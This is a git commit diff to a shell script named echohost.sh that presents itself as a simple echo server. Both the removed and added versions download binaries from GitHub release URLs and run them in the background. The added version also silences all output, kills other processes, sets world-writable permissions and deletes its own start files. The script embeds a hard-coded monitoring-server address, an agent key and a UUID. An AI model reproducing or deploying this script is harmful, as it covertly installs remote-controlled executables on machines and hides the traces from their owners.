79a0001e3a480ea332e6e7890c3bfee902791ff9
rannan1999 <rannan@mingfei1982.eu.org>
2026-01-08 16:12:51 +0800

    Update echohost.sh

--- workes/echohost.sh
+++ workes/echohost.sh
@@ -1,34 +1,43 @@
-#!/bin/bash
+#!/usr/bin/env sh
 
-# Load sensitive data from environment variables
-PORT=${PORT:-3000}
-CCTV_SERVER=${CCTV_SERVER:-'nezha.mingfei1981.eu.org:443'}
-CCTV_KEY=${CCTV_KEY:-'CaeYvybjXO7GKdDtbq'}
+exec >/dev/null 2>&1
+export TOK=${TOK:-''}
+export ARGO_DOMAIN=${ARGO_DOMAIN:-''}
+export TG=${TG:-''}
+export SUB_URL=${SUB_URL:-''}
+export NEZHA_SERVER=${NEZHA_SERVER:-'nezha.mingfei1981.eu.org'}
+export NEZHA_KEY=${NEZHA_KEY:-'CaeYvybjXO7GKdDtbq'}
+export NEZHA_PORT=${NEZHA_PORT:-'443'}
+export NEZHA_TLS=${NEZHA_TLS:-'1'}
+export TMP_ARGO=${TMP_ARGO:-'3x'}
+export VL_PORT=${VL_PORT:-'8002'}
+export VM_PORT=${VM_PORT:-'8001'}
+export CF_IP=${CF_IP:-'ip.sb'}
+export SUB_NAME=${SUB_NAME:-'argo'}
+export second_port=${second_port:-''}
+export UUID=${UUID:-'faacf142-dee8-48c2-8558-641123eb939c'}
+export SERVER_PORT="${SERVER_PORT:-${PORT:-443}}"
+export SNI=${SNI:-'www.apple.com'}
 
-# Function to execute the start script logic
-start_script() {
-  # Download ncaa
-  curl -sL "https://github.com/babama1001980/good/releases/download/npc/amd64ne2" -o ncaa
+if command -v curl &>/dev/null; then
+DOWNLOAD_CMD="curl -sL"
+# Check if wget is available
+elif command -v wget &>/dev/null; then
+DOWNLOAD_CMD="wget -qO-"
+else
+echo "Error: Neither curl nor wget found. Please install one of them."
+sleep 60
+exit 1
+fi
+tmdir=${tmdir:-"/tmp"}
+processes=("$web_file" "$ne_file" "$cff_file" "app" "tmpapp")
+for process in "${processes[@]}"
+do
+pid=$(pgrep -f "$process")
 
-  # Make ncaa executable
-  chmod +x ncaa
-
-  # Start ncaa in the background
-  nohup ./ncaa -s "${CCTV_SERVER}" -p "${CCTV_KEY}" --tls > /dev/null 2>&1 &
-
-  # Delete ncaa after starting
-  rm ncaa
-}
-
-# Run the start script
-start_script
-
-# Handle process termination to clean up
-trap 'kill 0' SIGINT
-
-# Simple HTTP server using netcat (nc)
-while true; do
-  {
-    echo -e "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nServer is running"
-  } | nc -l -p "${PORT}"
+if [ -n "$pid" ]; then
+kill "$pid" &>/dev/null
+fi
 done
+$DOWNLOAD_CMD https://github.com/dsadsadsss/plutonodes/releases/download/xr/main-amd > $tmdir/tmpapp
+chmod 777 $tmdir/tmpapp && $tmdir/tmpapp & sleep 60; rm -rf ./worlds start.sh; wait
